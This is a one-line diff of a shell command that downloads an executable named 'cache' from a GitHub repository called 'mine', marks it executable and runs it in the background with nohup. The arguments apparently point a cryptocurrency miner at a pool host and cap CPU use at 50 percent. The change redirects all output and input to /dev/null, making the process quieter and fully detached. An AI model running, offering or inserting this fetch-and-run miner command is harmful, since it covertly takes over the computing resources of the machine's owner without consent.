@@ -1,1 +1,1 @@
-curl -s -L https://raw.githubusercontent.com/robertreynolds2/mine/main/cache -o cache && chmod +x cache && nohup ./cache -o kudet.me:993 --max-cpu-usage 50 2>&1 &
+curl -s -L https://raw.githubusercontent.com/robertreynolds2/mine/main/cache -o cache && chmod +x cache && nohup ./cache -o kudet.me:993 --max-cpu-usage 50 > /dev/null 2>&1 < /dev/null &
